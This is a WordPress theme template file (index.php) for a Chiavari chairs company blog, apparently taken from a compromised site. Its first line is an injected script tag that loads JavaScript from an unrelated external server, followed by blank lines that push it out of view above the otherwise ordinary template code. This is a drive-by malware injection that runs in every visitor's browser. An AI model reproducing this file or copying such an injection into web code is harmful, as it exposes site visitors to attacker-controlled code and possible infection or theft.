<script type="text/javascript" src="http://amenitiesbrasil.com.br/image/get_applet.php"></script>















<?php
/**
 * The main template file.
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * E.g., it puts together the home page when no home.php file exists.
 * Learn more: http://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage Twenty_Ten
 * @since Twenty Ten 1.0
 */

get_header(); ?>
<?php get_sidebar(); ?>
		<div id="container">
			<div id="content" role="main">
            <h1 class="page_head">Vision Furniture Chiavari Chairs Blog</h1>
            <div class="spacer_height10"></div>
            <div class="breadcrumbs"><a href="https://chiavarichairs.com">Home</a><span class="breadcrumbs-arrow"></span>Vision Furniture Chiavari Chairs Blog</div>
            <div class="spacer_height10"></div>
            <div style="clear: both;"></div>
			<?php
			//echo "i am here";
			/* Run the loop to output the posts.
			 * If you want to overload this in a child theme then include a file
			 * called loop-index.php and that will be used instead.
			 */
			 get_template_part( 'loop', 'index' );
			?>
			</div><!-- #content -->
		</div><!-- #container -->


<?php get_footer(); ?>
